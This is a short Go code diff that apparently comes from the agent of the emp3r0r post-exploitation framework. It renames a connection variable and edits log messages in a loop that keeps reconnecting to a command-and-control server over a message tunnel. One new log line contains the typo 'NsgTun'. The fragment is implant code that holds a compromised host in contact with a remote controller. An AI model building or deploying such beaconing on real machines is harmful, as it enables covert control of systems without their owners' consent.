@@ -324,16 +324,16 @@ connect:
 	// connect to MsgAPI, the JSON based h2 tunnel
 	msgURL := emp3r0r_data.CCAddress + tun.MsgAPI + "/" + uuid.NewString()
 	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
-	emp3r0r_data.H2Json = conn
+	emp3r0r_data.CCMsgConn = conn
 	if err != nil {
 		log.Printf("Connect CC failed: %v, sleeping, will retry later", err)
 		util.TakeASnap()
 		goto connect
 	}
 	emp3r0r_data.KCPKeep = true
-	log.Println("Connected to CC TunAPI")
+	log.Println("Connecting to CC NsgTun...")
 	agent.CCMsgTun(ctx, cancel)
-	log.Printf("CCMsgTun closed, reconnecting")
+	log.Printf("CC MsgTun closed, reconnecting")
 	goto connect
 }
 
